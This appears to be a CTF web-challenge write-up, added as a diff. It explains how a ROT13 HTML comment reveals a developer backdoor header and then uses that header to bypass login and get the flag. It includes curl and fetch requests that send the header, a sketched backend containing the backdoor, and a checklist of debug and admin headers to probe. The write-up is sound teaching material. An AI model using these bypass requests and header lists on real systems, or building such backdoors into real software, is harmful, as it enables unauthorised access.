@@ -1,0 +1,197 @@
+# Developer Header Login Bypass – Full Writeup (CTF Web Challenge)
+
+## Overview
+
+This challenge involved analyzing a login page, discovering a hidden ROT13-encoded HTML comment, uncovering a **developer backdoor header**, and then leveraging it to obtain the flag. This writeup documents every step, including background concepts that help in solving other similar challenges.
+
+---
+
+## 1. Initial Observation
+
+The frontend provided a basic login form with JavaScript handling the POST request:
+
+```html
+<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
+```
+
+This unusual comment hinted at an encoded message.
+
+---
+
+## 2. Decoding the Comment (ROT13)
+
+The string inside the HTML comment is encoded using **ROT13**.
+
+Decoding it yields:
+
+```
+NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+```
+
+### Meaning:
+
+A developer left a **secret internal bypass header** used during testing. When included in the request, the backend behaves differently (usually skipping checks).
+
+This is a very common CTF trick.
+
+---
+
+## 3. JavaScript Behavior Analysis
+
+The original JS code:
+
+```js
+if !(data.success) {
+    prompt('Login successful!\nFlag:', data.flag);
+} else {
+    alert('Invalid credentials');
+}
+```
+
+### Issues identified:
+
+* `if !(data.success)` is **invalid syntax**.
+* Even after fixing, the backend intentionally sets `success = false` when sending the REAL flag in developer mode.
+
+This means:
+
+* The frontend **never shows the flag unless modified**.
+* Only `console.log(data)` exposes the flag.
+
+---
+
+## 4. Understanding the Backend Logic (Expected CTF Pattern)
+
+Based on observations, the backend likely follows this logic:
+
+```python
+if request.headers.get("X-Dev-Access") == "yes":
+    return { "success": false, "flag": REAL_FLAG }
+
+# Normal login
+if email == VALID_EMAIL and password == VALID_PASSWORD:
+    return { "success": true, "flag": FAKE_FLAG }
+
+return { "success": false, "message": "Invalid credentials" }
+```
+
+### Key Detail:
+
+The developer backdoor path **still returns `success: false`**, preventing the UI from showing the flag unless inspected manually.
+
+---
+
+## 5. Exploiting the Developer Header
+
+To trigger the backend bypass, you include:
+
+```
+X-Dev-Access: yes
+```
+
+Examples:
+
+### Using curl
+
+```bash
+curl -H "X-Dev-Access: yes" -H "Content-Type: application/json" \
+     -d '{"email":"x","password":"y"}' http://target/login
+```
+
+### Using JavaScript (corrected fetch)
+
+```js
+fetch('/login', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-Dev-Access': 'yes'
+    },
+    body: JSON.stringify(formData)
+});
+```
+
+### Using Burp Suite
+
+Add the header manually:
+
+```
+X-Dev-Access: yes
+```
+
+---
+
+## 6. Result
+
+Once the request is made with the dev header, the response includes the real flag:
+
+```json
+{
+  "success": false,
+  "flag": "FLAG{...}"
+}
+```
+
+Viewing `console.log(data)` or inspecting the network response reveals it.
+
+---
+
+## 7. Why This Challenge Matters (Important Cross-Challenge Concepts)
+
+This exercise teaches several repeat patterns you'll see in other CTFs:
+
+### ✔ Hidden developer interfaces
+
+* Dev headers
+* Debug parameters
+* Hidden query strings
+* Admin-only API paths
+
+### ✔ Encoded hints
+
+* ROT13
+* Base64
+* Hex / URL encoding
+* JS obfuscation
+
+### ✔ Frontend/backend mismatch vulnerabilities
+
+* Backend returns flag but frontend hides it
+* Incorrect success/failure conditions
+
+### ✔ Always inspect responses manually
+
+Even if UI says "invalid", the **actual response may contain the flag**.
+
+### ✔ Never trust frontend logic
+
+Real logic always happens server-side.
+
+---
+
+## 8. Checklist for Similar Future Challenges
+
+When analyzing any web CTF challenge:
+
+1. **View source** – look for comments, encoded text, hidden fields.
+2. **Search for ROT13/Base64 patterns**.
+3. **Inspect fetch() or AJAX requests**.
+4. **Check all response fields (not just success)**.
+5. **Try enabling debug/dev modes**:
+
+   * ?debug=true
+   * X-Debug: 1
+   * X-Admin: yes
+   * X-Dev-Mode: true
+6. **Manipulate headers in Burp**.
+7. **Observe mismatch between UI and backend**.
+
+These patterns repeat across many CTF web puzzles.
+
+---
+
+## Conclusion
+
+This challenge demonstrates how a hidden developer header can bypass authentication and reveal sensitive information like a flag. By combining HTML analysis, ROT13 decoding, JavaScript investigation, and HTTP header manipulation, we successfully exploited the backend's debug functionality.
+
+Whenever you encounter strange comments, unexpected fields, or unexplained failure messages—**always inspect deeper**.
